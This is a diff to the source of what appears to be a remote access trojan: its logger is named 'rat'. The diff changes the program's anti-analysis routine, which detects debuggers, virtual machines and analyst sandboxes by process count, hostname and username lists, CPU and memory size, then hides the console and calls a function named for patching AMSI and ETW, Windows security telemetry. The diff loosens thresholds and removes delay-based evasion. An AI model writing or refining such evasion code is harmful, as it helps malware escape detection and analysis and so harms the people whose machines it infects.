@@ -6,8 +6,6 @@ import socket
 import ctypes
 import psutil
 import logging
-import subprocess
-from ctypes import wintypes
 
 log = logging.getLogger("rat")
 
@@ -62,41 +60,27 @@ def check_vm_artifacts() -> bool:
 
 def sandbox_check() -> bool:
     if is_debugger_present():
-        time.sleep(random.randint(400, 800))
         return True
     try:
-        if len(list(psutil.process_iter())) < 50:
-            time.sleep(random.randint(300, 600))
+        if len(list(psutil.process_iter())) < 40:
             return True
     except Exception:
         pass
-    bad = ("vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox", "sample",
-           "malware", "analysis", "cuckoo", "virus", "test", "user", "admin")
+    bad = ("vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox", "sample", "cuckoo")
     try:
         host = socket.gethostname().lower()
         user = os.getlogin().lower()
         if any(x in host or x in user for x in bad):
-            time.sleep(random.randint(250, 500))
             return True
     except Exception:
         pass
     try:
-        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024**3:
-            time.sleep(random.randint(180, 400))
+        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 1.5 * 1024**3:
             return True
     except Exception:
         pass
     if check_vm_artifacts():
-        time.sleep(random.randint(300, 600))
         return True
-    try:
-        uptime = time.time() - psutil.boot_time()
-        if uptime < 600:
-            time.sleep(random.randint(200, 400))
-            return True
-    except Exception:
-        pass
-    time.sleep(random.randint(90, 240))
     return False
 
 def patch_amsi_etw() -> None:
@@ -128,6 +112,6 @@ def patch_amsi_etw() -> None:
 def anti_analysis() -> None:
     hide_console()
     if sandbox_check():
-        time.sleep(random.randint(600, 1200))
-        sys.exit(0)
+        log.warning("sandbox indicators detected, delaying")
+        time.sleep(random.randint(30, 90))
     patch_amsi_etw()
